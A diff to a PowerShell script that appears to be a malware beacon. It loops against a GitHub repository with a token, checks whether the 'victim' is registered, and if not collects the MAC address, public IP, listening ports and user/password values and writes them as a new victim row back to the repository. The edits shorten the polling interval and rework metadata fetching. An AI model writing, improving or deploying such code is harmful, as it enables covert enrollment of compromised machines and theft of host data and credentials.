@@ -15,8 +15,10 @@ $RegistryValue        = "PRE_ATTACK_GUID_REG_KEY"
 $PayloadFolder        = "$env:APPDATA\Payloads"
 $LogFile              = "$env:APPDATA\watcher_log.txt"
 
-$LoopIntervalSeconds  = 60   # BE POLITE TO GITHUB
+$LoopIntervalSeconds  = 10
 $UserAgent            = "Watcher-Script"
+
+Add-Type -AssemblyName PresentationFramework
 
 # === LOGGING FUNCTION ===
 function Log-Message {
@@ -60,26 +62,24 @@ $wc.Headers.Add("Authorization", "token $GitHubToken")
 $wc.Headers.Add("User-Agent", $UserAgent)
 $wc.Headers.Add("Accept", "application/vnd.github.v3+json")
 
-Add-Type -AssemblyName PresentationFramework
-
-# === FETCH METADATA ONCE ===
-[System.Windows.MessageBox]::Show("Fetching CSV metadata...")
-$MetaURL = "https://api.github.com/repos/$RepoOwner/$RepoName/contents/$CsvPathInRepo"
-$metaJson = $wc.DownloadString($MetaURL)
-$metaObj = ConvertFrom-Json $metaJson
-$downloadUrl = $metaObj.download_url
-$sha = $metaObj.sha
-[System.Windows.MessageBox]::Show("Download URL fetched successfully.")
-
 # === LOOP FOREVER ===
 while ($true) {
     try {
         [System.Windows.MessageBox]::Show("Checking registration status...")
 
-        # === Download CSV WITHOUT authentication ===
-        $csvText = (New-Object Net.WebClient).DownloadString($downloadUrl)
-        $lines = $csvText -split "`r?`n"
+        # === FETCH CSV METADATA AND CONTENT ===
+        $MetaURL = "https://api.github.com/repos/$RepoOwner/$RepoName/contents/$CsvPathInRepo"
+        $metaJson = $wc.DownloadString($MetaURL)
+        $metaObj = ConvertFrom-Json $metaJson
+        $downloadUrl = $metaObj.download_url
+        $sha = $metaObj.sha
 
+        if (-not $downloadUrl) {
+            throw "Download URL is missing from metadata."
+        }
+
+        $csvText = $wc.DownloadString($downloadUrl)
+        $lines = $csvText -split "`r?`n"
         $alreadyExists = $false
 
         foreach ($line in $lines) {
@@ -94,14 +94,12 @@ while ($true) {
 
         if (-not $alreadyExists) {
             [System.Windows.MessageBox]::Show("Victim not found. Registering...")
+
             # === COLLECT SYSTEM INFO ===
             $macs = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress }
             $mac  = if ($macs.Count -gt 0) { $macs[0].MACAddress } else { "UNKNOWN" }
 
-            try {
-                $ip = (New-Object Net.WebClient).DownloadString("https://api.ipify.org")
-            } catch { $ip = "UNKNOWN" }
-
+            try { $ip = (New-Object Net.WebClient).DownloadString("https://api.ipify.org") } catch { $ip = "UNKNOWN" }
             try {
                 $ports = netstat -an | Select-String "LISTENING" | ForEach-Object {
                     ($_ -split "\s+")[-2] -replace ".*:", ""
@@ -123,7 +121,6 @@ while ($true) {
                 }
             }
             $newId = $lastId + 1
-
             $newRow = "$newId,$Victim_GUID,$mac,$ip,$ports,$user,$pass,,," + "FALSE"
             $allLines = $lines + $newRow
             $finalCsv = ($allLines -join "`n")
@@ -150,16 +147,15 @@ while ($true) {
             Log-Message "[$(Get-Date)] ✅ New victim registered."
             [System.Windows.MessageBox]::Show("User successfully registered.")
 
-            # === Re-fetch METADATA to get NEW sha ===
+            # === Refresh Metadata (IMPORTANT) ===
             $metaJson = $wc.DownloadString($MetaURL)
             $metaObj = ConvertFrom-Json $metaJson
             $downloadUrl = $metaObj.download_url
             $sha = $metaObj.sha
-            [System.Windows.MessageBox]::Show("Metadata refreshed after registration.")
         }
         else {
             Log-Message "[$(Get-Date)] Victim already registered."
-            [System.Windows.MessageBox]::Show("User already 2::: registered.")
+            [System.Windows.MessageBox]::Show("User already registered.")
         }
     }
     catch {
